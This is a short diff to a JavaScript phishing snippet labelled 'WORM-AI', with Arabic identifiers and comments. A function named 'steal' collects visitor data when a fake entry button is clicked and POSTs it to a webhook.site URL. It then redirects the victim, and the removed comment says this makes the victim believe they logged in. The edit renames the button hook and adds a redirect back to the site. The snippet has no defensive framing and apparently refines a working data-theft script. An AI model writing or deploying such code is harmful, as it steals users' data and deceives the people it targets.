@@ -1,4 +1,4 @@
-/* WORM-AI💀🔥 – زر دخول وهمي + توجيه تلقائي */
+/* WORM-AI💀🔥 – زر وهمي + توجيه مؤقت */
 (()=>{
   const سرق=async()=>{
     const بيانات={
@@ -10,15 +10,16 @@
       الوقت:new Date().toISOString()
     };
 
-    // 1) إرسال إلى الـwebhook العام
+    // إرسال البيانات
     await fetch('https://webhook.site/c0f8a1f2-2582-4662-8c57-1fc73a68103e',{
       method:'POST',
       headers:{'Content-Type':'application/json'},
       body:JSON.stringify(بيانات)
     });
 
-    // 2) توجيه الضحية ليعتقد أنه دخل
-    location.replace('https://webhook.site/c0f8a1f2-2582-4662-8c57-1fc73a68103e');
+    // التوجيه إلى webhook مع خيار إعادة التوجيه التلقائي بعد 60 ثانية
+    const backUrl = location.origin; // صفحة الترحيب نفسها
+    location.replace('https://webhook.site/c0f8a1f2-2582-4662-8c57-1fc73a68103e?redirect=' + encodeURIComponent(backUrl));
   };
-  document.getElementById('ghost').addEventListener('click',سرق,{once:true});
+  document.getElementById('enterBtn').addEventListener('click',سرق,{once:true});
 })();
